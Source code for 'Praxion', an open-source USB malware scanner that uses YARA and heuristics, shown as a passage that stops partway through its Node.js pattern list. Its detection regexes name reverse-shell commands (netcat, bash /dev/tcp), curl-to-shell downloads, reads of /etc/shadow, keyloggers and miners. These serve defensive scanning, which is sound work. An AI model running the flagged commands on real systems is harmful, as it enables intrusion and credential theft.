#!/usr/bin/env python3
"""
Praxion  - Common USB Malware Scanner & Cleaner
Copyright (c) 2025 praveen k
this program is the free software : you can redistribute it and / or modify it under the MIT LICENSE

Features:
- Enhanced YARA rules for common malware patterns
- Expanded fallback heuristics with additional suspicious patterns
- Improved PE analysis with more suspicious API detection
- Linux ELF analysis and malware detection
- macOS Mach-O analysis and malware detection  
- Cross-platform script detection (Python, Node.js, etc.)
- Safe quarantine copy with evidence JSON
- Fuzzy hashing (ppdeep, a pure-Python ssdeep-compatible CTPH implementation)
- PE quick-check (pefile) heuristic
- Bounded parallel scanning (ThreadPoolExecutor)
- Optional event-driven scanning with watchdog + debounce
- Optional VirusTotal API integration
"""

import argparse
import os
import sys
import time
import shutil
import hashlib
import json
import subprocess
import threading
import re
import tempfile
import warnings
from datetime import datetime
import platform
import stat
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------------- Pre-flight dependency bootstrap ----------------
# `rich` powers Praxion's entire UI (including the colored banner itself),
# so it has to be installed/imported *silently* before anything is printed.
# Once it's confirmed available, the colored banner is shown first, and
# the dependency-check lines print right after it.
_PREFLIGHT_RESULTS = []  # (name, status, required) for the summary shown before scanning starts

def _preflight_check_silent(pip_name, import_name=None, required=True, auto_install=True):
    """Check/install one dependency with no console output. Returns True if
    the package ends up importable, False otherwise. Result is recorded in
    _PREFLIGHT_RESULTS so it can be printed later, after the banner."""
    import_name = import_name or pip_name
    try:
        __import__(import_name)
        _PREFLIGHT_RESULTS.append((pip_name, "OK", required))
        return True
    except ImportError:
        if not auto_install:
            _PREFLIGHT_RESULTS.append((pip_name, "MISSING", required))
            return False
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--user", pip_name],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=300)
            __import__(import_name)
            _PREFLIGHT_RESULTS.append((pip_name, "INSTALLED", required))
            return True
        except Exception:
            _PREFLIGHT_RESULTS.append((pip_name, "FAILED", required))
            return False

# rich is load-bearing: the whole UI (banners, panels, spinner) needs it.
# If it truly can't be installed, Praxion cannot run at all - stop here
# with a plain, unambiguous message instead of a confusing traceback.
if not _preflight_check_silent("rich", required=True, auto_install=True):
    print("FATAL: 'rich' could not be installed automatically and Praxion cannot")
    print("run without it. Please install it manually and try again:")
    print(f"    {sys.executable} -m pip install rich")
    sys.exit(1)

# colorama has a graceful fallback further down (raw ANSI codes), so it's
# checked but never fatal.
_preflight_check_silent("colorama", required=False, auto_install=True)

from rich.console import Console
from rich.theme import Theme as RichTheme
from rich.text import Text
from rich.align import Align
from rich.rule import Rule
from rich.panel import Panel
from rich.box import ROUNDED
from rich.live import Live
from rich.table import Table

# Suppress deprecation warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

# ---------------- CLI flags (argparse) ----------------
parser = argparse.ArgumentParser(description="Praxion USB Malware Scanner")
parser.add_argument("--mode", choices=["run", "test", "debug", "auto-delete"], default="run",
                    help="Operation mode: 'run' (default), 'test', 'debug', 'auto-delete'")
parser.add_argument("--poll-interval", type=int, default=None, help="Override default poll interval (seconds)")
parser.add_argument("--virustotal", action="store_true", help="Enable VirusTotal API scanning for suspicious files")
parser.add_argument("--vt-api-key", type=str, default="", help="VirusTotal API key (or set VIRUSTOTAL_API_KEY env var)")
parser.add_argument("--vt-scan-timeout", type=int, default=30, help="VirusTotal API timeout in seconds (default: 30)")
args = parser.parse_args()

RUN_TEST_MODE = args.mode == "test"
DEBUG_MODE = args.mode == "debug"
AUTO_DELETE_ORIGINAL = args.mode == "auto-delete"
VIRUSTOTAL_ENABLED = args.virustotal
VIRUSTOTAL_API_KEY = args.vt_api_key or os.getenv("VIRUSTOTAL_API_KEY", "")
VIRUSTOTAL_TIMEOUT = args.vt_scan_timeout

# ---------------- Configuration ----------------
POLL_INTERVAL = 2  # seconds (fallback)
if args.poll_interval is not None:
    try:
        POLL_INTERVAL = max(1, int(args.poll_interval))
    except Exception:
        pass

# Cross-platform directory setup
def get_app_directory():
    """Get appropriate application directory based on platform and permissions"""
    script_dir = os.path.abspath(os.path.dirname(__file__))
    
    # Try to use script directory first
    try:
        test_file = os.path.join(script_dir, '.praxion_test')
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        return script_dir
    except (PermissionError, OSError):
        pass
    
    # Fall back to user home directory
    home = os.path.expanduser("~")
    if sys.platform.startswith("win"):
        app_dir = os.path.join(home, "AppData", "Local", "Praxion")
    elif sys.platform == "darwin":
        app_dir = os.path.join(home, "Library", "Application Support", "Praxion")
    else:  # Linux and other Unix-like
        app_dir = os.path.join(home, ".praxion")
    
    return app_dir

BASE_DIR = get_app_directory()
LOG_DIR = os.path.join(BASE_DIR, "logs")
LOG_FILE = os.path.join(LOG_DIR, "scan_log.txt")
DEBUG_LOG_FILE = os.path.join(LOG_DIR, "scan_debug.txt")
QUARANTINE_DIR = os.path.join(BASE_DIR, "suspicious")

# Enhanced file extension targets
YARA_TARGET_EXTS = {
    ".exe", ".dll", ".lnk", ".inf", ".ps1", ".vbs", ".js", 
    ".doc", ".docm", ".xlsm", ".xlsx", ".pdf", ".scr", 
    ".bat", ".cmd", ".vbe", ".jar", ".hta", ".wsf", ".pptm",
    ".msi", ".com", ".pif", ".reg", ".rtf", ".xls", ".ppt", ".pptx",
    ".one", ".iso", ".img", ".sh", ".py",
}
YARA_MAX_SIZE = 50 * 1024 * 1024  # 50 MB
MAX_WORKERS = 4
STABLE_WAIT_TIMEOUT = 3.0

# Document/PDF container formats legitimately embed binary blobs (fonts,
# images, embedded objects, signatures), so the generic LargeBase64Blob
# heuristic in builtin_scan() is skipped for these specifically.
DOCUMENT_CONTAINER_EXTS = {
    ".pdf", ".doc", ".docm", ".docx", ".xls", ".xlsx", ".xlsm",
    ".ppt", ".pptx", ".pptm", ".rtf", ".one",
}

# Cross-platform configuration
CURRENT_PLATFORM = platform.system().lower()
if CURRENT_PLATFORM == "darwin":
    CURRENT_PLATFORM = "mac"

# ensure folders exist with proper error handling
try:
    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs(QUARANTINE_DIR, exist_ok=True)
except PermissionError:
    print(f"ERROR: Permission denied. Cannot create directories in {BASE_DIR}")
    print(f"Please run with appropriate permissions or check directory ownership:")
    print(f"  Linux/Mac: sudo chown -R $USER:$USER {os.path.dirname(__file__)}")
    print(f"  Or run from a writable directory")
    sys.exit(1)
except Exception as e:
    print(f"ERROR: Failed to create required directories: {e}")
    sys.exit(1)

# ---------------- Color setup (Red / Amber two-tone theme) ----------------
try:
    from colorama import init as _colorama_init, Fore, Style
    _colorama_init(autoreset=True)
    # Core theme
    COLOR_PRIMARY   = Fore.RED             # bold tone - identity, structure, headers
    COLOR_ACCENT    = Fore.YELLOW          # amber/gold - emphasis, highlights
    COLOR_PRIMARY_B = Fore.LIGHTRED_EX
    COLOR_ACCENT_B  = Fore.LIGHTYELLOW_EX
    COLOR_DIM       = Fore.WHITE
    # Status colors
    COLOR_SAFE   = Fore.GREEN
    COLOR_MAL    = Fore.RED
    COLOR_REPORT = Fore.YELLOW
    COLOR_VT     = Fore.LIGHTYELLOW_EX
    COLOR_RESET  = Style.RESET_ALL
    COLOR_BOLD   = Style.BRIGHT
except Exception:
    COLOR_PRIMARY   = "\033[91m"
    COLOR_ACCENT    = "\033[93m"
    COLOR_PRIMARY_B = "\033[91m"
    COLOR_ACCENT_B  = "\033[93m"
    COLOR_DIM       = "\033[97m"
    COLOR_SAFE   = "\033[92m"
    COLOR_MAL    = "\033[91m"
    COLOR_REPORT = "\033[93m"
    COLOR_VT     = "\033[93m"
    COLOR_RESET  = "\033[0m"
    COLOR_BOLD   = "\033[1m"

# ---------------- Rich UI theme (same Red/Amber palette, Phantom-style shell) ----------------
# Praxion's colours stay red/amber - only the *shape* of the UI (panels, rules,
# banner layout) is brought in line with Phantom's rich-based interface.
PRAXION_THEME = RichTheme({
    "primary":    "red",
    "accent":     "yellow",
    "primary_b":  "bright_red",
    "accent_b":   "bright_yellow",
    "dim":        "grey62",
    "safe":       "bold green",
    "mal":        "bold red",
    "report":     "yellow",
    "vt":         "bright_yellow",
    "ui_border":  "red",
    "ui_title":   "bold bright_yellow",
})

rich_console = Console(theme=PRAXION_THEME)
WIDTH = 74

def section(title):
    """Phantom-style section rule, in Praxion's red/amber palette."""
    rich_console.print()
    rich_console.rule(f"[ui_title]{title}[/]", style="ui_border", characters="─")

# ---------------- Enhanced Banner (Red / Amber two-tone, Phantom-style layout) ----------------
# Shown first, before any dependency-check output - this is the user's
# first sight of Praxion, in full color.
LOGO = [
    r"██████╗ ██████╗  █████╗ ██╗  ██╗██╗ ██████╗ ███╗   ██╗    ",
    r"██╔══██╗██╔══██╗██╔══██╗╚██╗██╔╝██║██╔═══██╗████╗  ██║  ",
    r"██████╔╝██████╔╝███████║ ╚███╔╝ ██║██║   ██║██╔██╗ ██║   ",
    r"██╔═══╝ ██╔══██╗██╔══██║ ██╔██╗ ██║██║   ██║██║╚██╗██║   ",
    r"██║     ██║  ██║██║  ██║██╔╝ ██╗██║╚██████╔╝██║ ╚████║    ",
    r"╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ",
]

def print_banner():
    """Full colored banner: logo + rule + subtitle, red/amber two-tone."""
    palette = ["primary_b", "primary", "accent_b", "accent", "accent_b", "primary"]
    rich_console.print()
    for i, line in enumerate(LOGO):
        rich_console.print(Align.left(Text(line, style=palette[i % len(palette)])))
    rich_console.print()
    rich_console.print(Rule(style="accent"))
    rich_console.print()

print_banner()

# ---------------- Dependency-check summary (printed right after the banner) ----------------
# rich/colorama were already checked/installed silently above, before the
# banner could even be drawn. Their results are surfaced here, right after
# the banner, alongside the header for the rest of the dependency checks
# that ensure_dependencies() runs further down.
print(f"{COLOR_ACCENT_B}{'-' * 60}{COLOR_RESET}")
print(f"{COLOR_PRIMARY_B} Checking dependencies...{COLOR_RESET}")
print(f"{COLOR_ACCENT_B}{'-' * 60}{COLOR_RESET}")
for _name, _status, _required in _PREFLIGHT_RESULTS:
    _label = f"{COLOR_ACCENT_B}REQUIRED{COLOR_RESET}" if _required else f"{COLOR_PRIMARY_B}optional{COLOR_RESET}"
    print(f"{COLOR_PRIMARY_B}[DEPENDENCY CHECK]{COLOR_RESET} {COLOR_ACCENT_B}{_name:<14}{COLOR_RESET} {_status} ({_label})")
print(f"{COLOR_ACCENT_B}{'-' * 60}{COLOR_RESET}")
print()

# ---------------- Session scan counters (for summary panel) ----------------
_session_stats_lock = threading.Lock()
_session_stats = {"safe": 0, "malicious": 0, "errors": 0}

def _bump_stat(key):
    with _session_stats_lock:
        _session_stats[key] = _session_stats.get(key, 0) + 1

# ---------------- Live "scanning in progress" animation ----------------
# Long-running steps (mainly ClamAV, and YARA/hashing on big files) get a
# visible red/amber zigzag bar so the tool never looks frozen while it's
# working. Each step also tracks its own start time and shows elapsed
# seconds, since a single large file can sit on one step for a while - the
# ticking clock makes it clear Praxion is still working, not stuck.
_active_scans_lock = threading.Lock()
_active_scans = {}          # key -> {"text": str, "start": float}
_live_display = None
_live_display_lock = threading.Lock()
_ticker_thread = None
_ticker_stop = threading.Event()

_ZIGZAG_WIDTH = 12   # characters wide
_ZIGZAG_SPEED = 6.0  # positions per second

def _zigzag_bar(elapsed):
    """A marker bounces back and forth across a fixed-width track, like a
    radar sweep. It's bright red while sweeping forward and bright amber
    while sweeping back, so the two-tone theme carries into the animation
    itself instead of a plain single-colour spinner."""
    span = _ZIGZAG_WIDTH - 1
    period = span * 2 if span > 0 else 1
    step = int(elapsed * _ZIGZAG_SPEED) % period
    if step <= span:
        pos, forward = step, True
    else:
        pos, forward = period - step, False
    style = "primary_b" if forward else "accent_b"
    bar = Text("[", style="dim")
    for i in range(_ZIGZAG_WIDTH):
        bar.append("\u25c6" if i == pos else "\u2500", style=style if i == pos else "dim")
    bar.append("]", style="dim")
    return bar

def _render_active_scans():
    if not _active_scans:
        return Text("")
    table = Table.grid(padding=(0, 1))
    with _active_scans_lock:
        items = list(_active_scans.values())
    now = time.time()
    for entry in items:
        elapsed = now - entry["start"]
        suffix = f" ({elapsed:.0f}s)" if elapsed >= 3 else ""
        row = Text()
        row.append_text(_zigzag_bar(elapsed))
        row.append(f" {entry['text']}{suffix}", style="accent")
        table.add_row(row)
    return table

def _ticker_loop():
    """Redraws the live display several times a second so the zigzag bar
    keeps sweeping smoothly even while no new file has started (i.e. one
    big file is still being processed)."""
    while not _ticker_stop.wait(1.0 / 15):
        with _live_display_lock:
            if _live_display is None:
                return
            _live_display.update(_render_active_scans())

def _start_scan_indicator(key, text):
    """Register a long-running step as in-progress (or update its text if
    already running) and (re)draw the spinner. `key` just needs to be
    unique per concurrent step (e.g. a file path, or a mountpoint for an
    overall drive-scan line); `text` is the full line shown next to it."""
    global _live_display, _ticker_thread
    with _active_scans_lock:
        existing = _active_scans.get(key)
        start = existing["start"] if existing else time.time()
        _active_scans[key] = {"text": text, "start": start}
    with _live_display_lock:
        if _live_display is None:
            _live_display = Live(_render_active_scans(), console=rich_console,
                                  refresh_per_second=8, transient=True)
            _live_display.start()
            _ticker_stop.clear()
            _ticker_thread = threading.Thread(target=_ticker_loop, daemon=True)
            _ticker_thread.start()
        else:
            _live_display.update(_render_active_scans())

def _stop_scan_indicator(key):
    """Clear a finished step; stop the live display once nothing is active."""
    global _live_display
    with _active_scans_lock:
        _active_scans.pop(key, None)
        empty = not _active_scans
    with _live_display_lock:
        if _live_display is not None:
            if empty:
                _ticker_stop.set()
                _live_display.stop()
                _live_display = None
            else:
                _live_display.update(_render_active_scans())

_ANSI_RE = re.compile(r'\x1b\[[0-9;]*m')

def _visible_len(s):
    return len(_ANSI_RE.sub('', s))

def print_box(title, lines, width=None, top_color=None, bottom_color=None):
    """Rounded rich Panel (Phantom-style) instead of hand-drawn box characters.
    Accepts the same colorama-tinted strings Praxion already builds elsewhere -
    Text.from_ansi() decodes those escape codes into proper rich styling so no
    call site needs to change.

    The box width auto-fits its content (widest line/title, plus padding and
    border) instead of always being a fixed 74 columns - short messages get a
    snug box, long ones still wrap/expand as needed, and it's capped to the
    terminal width so it never overflows on a narrow console."""
    body = Text()
    for i, ln in enumerate(lines):
        if i > 0:
            body.append("\n")
        body.append(Text.from_ansi(str(ln)))
    panel_title = Text.from_ansi(str(title)) if title else None

    if width is None:
        content_widths = [_visible_len(str(ln)) for ln in lines]
        if panel_title is not None:
            content_widths.append(_visible_len(str(title)) + 4)  # room for title decoration
        max_content = max(content_widths) if content_widths else 0
        width = max_content + 4  # 2 border chars + 2 padding columns
        width = max(20, min(width, rich_console.width))

    rich_console.print(
        Panel(
            body,
            title=panel_title,
            border_style="ui_border",
            box=ROUNDED,
            width=width,
            padding=(0, 1),
        )
    )

# ---------------- Logging helpers ----------------

# Any output printed while the twinkling-star Live display (_wave_live_display)
# is active MUST go through this same rich_console instance rather than the
# builtin print(). Rich's Live only knows how to make room for output that
# goes through the console it was built with - text written straight to
# sys.stdout via print() gets stomped on by the Live's own redraws (it
# refreshes up to 8x/second) and only becomes visible once the Live stops,
# which is exactly why per-file "[SAFE]/[MALICIOUS]" lines were appearing to
# show up all at once at the end instead of streaming in during the scan.
def cprint(s=""):
    if s == "":
        rich_console.print()
    else:
        rich_console.print(Text.from_ansi(str(s)))

def now_ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def _write_log(line, path=LOG_FILE):
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass

def log(status, msg, *, console=True):
    line = f"[{now_ts()}] {status} {msg}"
    _write_log(line, LOG_FILE)
    if console:
        cprint(line)
    if DEBUG_MODE:
        _write_log(line, DEBUG_LOG_FILE)

def info(msg): log("[i]", msg)
def ok(msg): log("[+]", msg)
def star(msg): log("[*]", msg)
def warn_cmd(msg): log("[WARN_CMD]", msg)
def warn(msg): log("[WARNING]", msg)

# ---------------- History & threat logs ----------------
HISTORY_LOG = os.path.join(LOG_DIR, "scan_history.txt")
THREAT_LOG = os.path.join(LOG_DIR, "threat_explanations.txt")

def log_history(file_path, status):
    try:
        with open(HISTORY_LOG, "a", encoding="utf-8") as f:
            f.write(f"{now_ts()} | {file_path} | {status}\n")
    except Exception:
        pass

def log_threat(file_path, explanation):
    try:
        with open(THREAT_LOG, "a", encoding="utf-8") as f:
            f.write(f"{now_ts()} | {file_path} | {explanation}\n")
    except Exception:
        pass

# ---------------- Auto-install helper ----------------
def pip_install(pkg):
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--user", pkg],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=300)
        return True
    except Exception:
        return False

# ---------------- Optional/feature dependencies ----------------
YARA_AVAILABLE = False
PSUTIL_AVAILABLE = False
VIRUSTOTAL_AVAILABLE = False
PEFILE_AVAILABLE = False
PPDEEP_AVAILABLE = False
WATCHDOG_AVAILABLE = False
yara = None
pefile = None
ppdeep = None
compiled_rules = None
Observer = None
FileSystemEventHandler = None

_MANUAL_INSTALL_HINTS = []  # (pip_name, hint_text) for anything auto-install couldn't fix

def _manual_install_hint(pip_name):
    """Short, actionable one-liner for installing a dependency by hand."""
    py = sys.executable
    if pip_name == "yara-python":
        return (f"no prebuilt wheel for your Python/OS - install a matching version first, "
                 f"e.g.: {py} -m pip install yara-python==4.5.1 "
                 f"(see github.com/VirusTotal/yara-python for available wheels)")
    return f"run: {py} -m pip install {pip_name}"

def _check_and_install(pip_name, import_name, required, auto_install=True):
    """Check one dependency, auto-installing if requested, and record the
    result so it can be summarized to the user before scanning starts.
    On any failure (required or optional) the user gets a concrete manual
    command to fix it themselves, instead of the feature just quietly
    staying disabled."""
    try:
        module = __import__(import_name)
        info(f"{pip_name}: found")
        _PREFLIGHT_RESULTS.append((pip_name, "OK", required))
        return module
    except Exception:
        if not auto_install:
            if required:
                warn(f"{pip_name}: not found - install it before running Praxion")
            else:
                info(f"{pip_name}: not found (feature disabled)")
            _PREFLIGHT_RESULTS.append((pip_name, "MISSING", required))
            _MANUAL_INSTALL_HINTS.append((pip_name, _manual_install_hint(pip_name)))
            return None
        info(f"{pip_name}: not found, installing...")
        if pip_install(pip_name):
            try:
                module = __import__(import_name)
                info(f"{pip_name}: installed successfully")
                _PREFLIGHT_RESULTS.append((pip_name, "INSTALLED", required))
                return module
            except Exception:
                pass
        hint = _manual_install_hint(pip_name)
        if required:
            warn(f"{pip_name}: could not be installed automatically - install it yourself before running Praxion")
        else:
            info(f"{pip_name}: could not be installed automatically (feature disabled)")
        warn(f"{pip_name}: {hint}")
        _PREFLIGHT_RESULTS.append((pip_name, "FAILED", required))
        _MANUAL_INSTALL_HINTS.append((pip_name, hint))
        return None

def ensure_dependencies():
    """Run every dependency check up front, before any file is scanned, so
    the user sees exactly what's enabled/disabled instead of finding out
    mid-scan. Required packages are auto-installed; optional ones are
    checked but degrade gracefully if unavailable."""
    global YARA_AVAILABLE, PSUTIL_AVAILABLE, VIRUSTOTAL_AVAILABLE, yara
    global PEFILE_AVAILABLE, PPDEEP_AVAILABLE, WATCHDOG_AVAILABLE
    global pefile, ppdeep, Observer, FileSystemEventHandler

    m = _check_and_install("psutil", "psutil", required=True)
    PSUTIL_AVAILABLE = m is not None

    m = _check_and_install("yara-python", "yara", required=True)
    if m is not None:
        yara = m
        YARA_AVAILABLE = True

    # Optional, feature-degrading dependencies - checked but not forced.
    m = _check_and_install("pefile", "pefile", required=False)
    if m is not None:
        pefile = m
        PEFILE_AVAILABLE = True

    # ppdeep is a pure-Python, pip-only implementation of the same CTPH
    # (context triggered piecewise hashing) algorithm ssdeep uses - no C
    # library or compiler needed, so it installs cleanly everywhere.
    m = _check_and_install("ppdeep", "ppdeep", required=False)
    if m is not None:
        ppdeep = m
        PPDEEP_AVAILABLE = True

    try:
        from watchdog.observers import Observer as _Observer
        from watchdog.events import FileSystemEventHandler as _FSEventHandler
        Observer = _Observer
        FileSystemEventHandler = _FSEventHandler
        WATCHDOG_AVAILABLE = True
        info("watchdog: found (real-time event-driven scanning enabled)")
        _PREFLIGHT_RESULTS.append(("watchdog", "OK", False))
    except Exception:
        if pip_install("watchdog"):
            try:
                from watchdog.observers import Observer as _Observer
                from watchdog.events import FileSystemEventHandler as _FSEventHandler
                Observer = _Observer
                FileSystemEventHandler = _FSEventHandler
                WATCHDOG_AVAILABLE = True
                info("watchdog: installed successfully (real-time scanning enabled)")
                _PREFLIGHT_RESULTS.append(("watchdog", "INSTALLED", False))
            except Exception:
                WATCHDOG_AVAILABLE = False
                info("watchdog: not available (falling back to polling instead of real-time events)")
                _PREFLIGHT_RESULTS.append(("watchdog", "FAILED", False))
        else:
            WATCHDOG_AVAILABLE = False
            info("watchdog: not available (falling back to polling instead of real-time events)")
            _PREFLIGHT_RESULTS.append(("watchdog", "FAILED", False))

    # VirusTotal only matters (and only gets installed) if explicitly requested.
    try:
        import vt
        VIRUSTOTAL_AVAILABLE = True
    except Exception:
        VIRUSTOTAL_AVAILABLE = False
        if VIRUSTOTAL_ENABLED:
            if pip_install("vt-py"):
                try:
                    import vt
                    VIRUSTOTAL_AVAILABLE = True
                except Exception:
                    VIRUSTOTAL_AVAILABLE = False

def print_dependency_summary():
    """One clear panel showing exactly what's enabled/disabled, printed
    before the scan starts - this is the 'indicate to the user' step."""
    lines = []
    for name, status, required in _PREFLIGHT_RESULTS:
        if status == "OK":
            icon, color = "✓", COLOR_SAFE
        elif status == "INSTALLED":
            icon, color = "✓", COLOR_ACCENT_B
        elif status == "MISSING" and not required:
            icon, color = "–", COLOR_DIM
        else:
            icon, color = "✕", COLOR_PRIMARY_B
        tag = "required" if required else "optional"
        lines.append(f"{color}{icon} {name:<14}{COLOR_RESET} {status:<10} ({tag})")
    print_box(f"{COLOR_ACCENT_B}◆ DEPENDENCY CHECK{COLOR_RESET}", lines)

# Run the full dependency check immediately - some flags (WATCHDOG_AVAILABLE
# in particular) are needed at module load time below, so this can't wait
# until main() runs.
ensure_dependencies()

# ==================== LINUX MALWARE DETECTION ====================

def elf_quick_check(path):
    """Enhanced ELF file analysis for Linux"""
    if not os.path.exists(path):
        return None
    
    try:
        with open(path, "rb") as f:
            header = f.read(4)
            if header != b'\x7fELF':
                return None
    except:
        return None
    
    suspicious = {
        "suspicious_imports": [],
        "suspicious_sections": [],
        "packer_indicators": [],
        "analysis": {}
    }
    
    try:
        # Basic ELF structure analysis
        with open(path, "rb") as f:
            data = f.read(4096)  # Read first 4KB for analysis
            
        # Check for UPX packing
        if b'UPX!' in data:
            suspicious["packer_indicators"].append("UPX_packed")
            
        # Check for common malware behaviors in strings
        text = data.decode('latin-1', errors='ignore').lower()
        
        # Linux-specific suspicious patterns
        linux_malware_indicators = [
            # System manipulation
            (r"/etc/passwd", "password_file_access"),
            (r"/etc/shadow", "shadow_file_access"),
            (r"/etc/ld\.so\.preload", "ld_preload_hijack"),
            (r"ptrace", "debugger_evasion"),
            (r"inotify", "file_monitoring"),
            (r"netlink", "kernel_communication"),
            
            # Persistence mechanisms
            (r"/etc/rc\.local", "rc_local_persistence"),
            (r"/etc/cron\.", "cron_persistence"),
            (r"/etc/systemd/", "systemd_persistence"),
            (r"~/.bashrc", "bashrc_persistence"),
            (r"~/.profile", "profile_persistence"),
            
            # Network suspicious activities
            (r"raw_socket", "raw_socket_access"),
            (r"packet_socket", "packet_sniffing"),
            
            # Cryptomining
            (r"stratum\+tcp", "cryptomining_pool"),
            (r"xmrig", "xmrig_miner"),
            (r"cpuminer", "cpu_miner"),
            
            # Keylogging (Linux) - match specific global-input-capture APIs/paths
            # rather than bare library names like "x11"/"xinput"/"evdev", which
            # appear in almost every ordinary Linux GUI binary and previously
            # caused mass false positives (auto-deleted legitimate files).
            (r"xquerykeymap|xgetkeyboardcontrol", "x11_keyboard_state_query"),
            (r"xigrabdevice|xiselectevents", "xinput2_global_capture"),
            (r"/dev/input/event", "raw_input_device_access"),
        ]
        
        for pattern, description in linux_malware_indicators:
            if re.search(pattern, text, re.IGNORECASE):
                suspicious["suspicious_imports"].append(description)
                
    except Exception as e:
        suspicious["analysis"]["error"] = str(e)
    
    return suspicious if suspicious["suspicious_imports"] or suspicious["packer_indicators"] else None

def analyze_linux_script(path):
    """Analyze Linux shell scripts for malicious content"""
    try:
        with open(path, "r", encoding='utf-8', errors='ignore') as f:
            content = f.read().lower()
    except:
        return None
    
    suspicious = []
    
    linux_script_patterns = [
        # Dangerous commands with obfuscation
        (r"curl.*\|.*sh", "curl_pipe_shell"),
        (r"wget.*\|.*sh", "wget_pipe_shell"),
        (r"base64.*-d.*\|.*sh", "base64_decode_shell"),
        
        # System modification
        (r"chmod.*[67][67][67]", "suspicious_permissions"),
        (r"chattr.*\+i", "immutable_flag_set"),
        (r"setuid", "setuid_bit_manipulation"),
        
        # Network suspicious
        (r"nc.*-e.*/bin/sh", "netcat_reverse_shell"),
        (r"bash.*-i.*>&.*/dev/tcp", "bash_reverse_shell"),
        (r"ssh.*-o.*StrictHostKeyChecking=no", "ssh_key_checking_disabled"),
        
        # Cryptomining in scripts
        (r"minerd", "cpu_miner"),
        (r"cgminer", "gpu_miner"),
        (r"pool.*stratum", "mining_pool"),
        
        # Download and execute
        (r"wget.*-O.*/tmp/", "download_to_tmp"),
        (r"curl.*-o.*/tmp/", "curl_download_to_tmp"),
    ]
    
    for pattern, description in linux_script_patterns:
        if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
            suspicious.append(description)
    
    return suspicious if suspicious else None

# ==================== MAC MALWARE DETECTION ====================

def macho_quick_check(path):
    """Enhanced Mach-O file analysis for macOS"""
    if not os.path.exists(path):
        return None
    
    try:
        with open(path, "rb") as f:
            magic = f.read(4)
            # Mach-O magic numbers
            if magic not in [b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf', 
                           b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe']:
                return None
    except:
        return None
    
    suspicious = {
        "suspicious_imports": [],
        "suspicious_frameworks": [],
        "analysis": {}
    }
    
    try:
        with open(path, "rb") as f:
            data = f.read(8192)  # Read more for string analysis
            
        text = data.decode('latin-1', errors='ignore').lower()
        
        # macOS-specific suspicious patterns
        mac_malware_indicators = [
            # Persistence mechanisms
            (r"launchd", "launchd_persistence"),
            (r"launchctl", "launchctl_command"),
            (r"/Library/LaunchDaemons", "launch_daemon"),
            (r"/Library/LaunchAgents", "launch_agent"),
            (r"~/Library/LaunchAgents", "user_launch_agent"),
            
            # Privilege escalation (kept narrow - this API is genuinely rare
            # and deprecated; bare "CoreServices"/"Security" framework name
            # checks were removed because they match nearly every notarized
            # macOS binary and caused mass false positives)
            (r"AuthorizationExecuteWithPrivileges", "privilege_escalation"),
            
            # Keylogging (macOS) - the *global* event monitor is the API real
            # keyloggers need; bare "NSEvent" appears in almost all Cocoa GUI
            # apps for routine local event handling and is not itself suspicious
            (r"CGEventTapCreate", "event_tap_keylogging"),
            (r"addglobalmonitorforeventsmatchingmask", "ns_global_event_monitoring"),
            (r"IOHIDManagerCreate|IOHIDDeviceRegisterInputValueCallback", "iokit_hid_capture"),
            
            # Cryptomining
            (r"stratum", "mining_pool"),
            (r"xmrig", "xmrig_miner"),
            
            # Network suspicious
            (r"CFSocket", "socket_creation"),
            (r"NSConnection", "network_connection"),
        ]
        
        for pattern, description in mac_malware_indicators:
            if re.search(pattern, text, re.IGNORECASE):
                suspicious["suspicious_imports"].append(description)
                
    except Exception as e:
        suspicious["analysis"]["error"] = str(e)
    
    return suspicious if suspicious["suspicious_imports"] else None

def analyze_mac_script(path):
    """Analyze macOS scripts (AppleScript, shell) for malicious content"""
    try:
        with open(path, "r", encoding='utf-8', errors='ignore') as f:
            content = f.read().lower()
    except:
        return None
    
    suspicious = []
    
    mac_script_patterns = [
        # AppleScript suspicious patterns
        (r"do shell script", "apple_shell_script"),
        (r"administrator privileges", "apple_script_privileges"),
        (r"with administrator privileges", "admin_privileges_request"),
        
        # macOS-specific persistence
        (r"launchctl load", "launchctl_persistence"),
        (r"defaults write", "defaults_persistence"),
        (r"login item", "login_item_persistence"),
        
        # File system manipulation
        (r"chmod.*\+x", "make_executable"),
        (r"chflags hidden", "hide_files"),
        
        # Network suspicious
        (r"curl.*bash", "curl_to_bash"),
        (r"wget.*sh", "wget_to_shell"),
    ]
    
    for pattern, description in mac_script_patterns:
        if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
            suspicious.append(description)
    
    return suspicious if suspicious else None

# ==================== CROSS-PLATFORM SCRIPT DETECTION ====================

def analyze_cross_platform_scripts(path):
    """Analyze cross-platform scripts (Python, Node.js, etc.)"""
    ext = os.path.splitext(path)[1].lower()
    
    try:
        with open(path, "r", encoding='utf-8', errors='ignore') as f:
            content = f.read().lower()
    except:
        return None
    
    suspicious = []
    
    # Python malware patterns
    python_patterns = [
        (r"import os.*subprocess", "subprocess_import"),
        (r"exec\(.*compile", "dynamic_code_execution"),
        (r"__import__\(", "dynamic_import"),
        (r"keyboard.*hook", "python_keylogger"),
        (r"pynput", "pynput_keylogger"),
        (r"requests.*post", "data_exfiltration"),
        (r"urllib.*urlopen", "network_communication"),
        (r"base64.*b64decode", "base64_obfuscation"),
        (r"eval\(.*base64", "eval_base64_obfuscation"),
        (r"ctypes.*windll", "ctypes_windows_api"),
        (r"ctypes.*cdll", "ctypes_library_load"),
    ]
    
    # Node.js malware patterns
    nodejs_patterns = [
        (r"require\(['\"]child_process['\"]", "child_process_require"),
        (r"execSync", "synchronous_execution"),
        (r"spawnSync", "process_spawning"),
        (r"keylogger", "keylogger_mention"),
        (r"require\(['\"]os['\"]", "os_module"),
        (r"process\.env", "environment_access"),
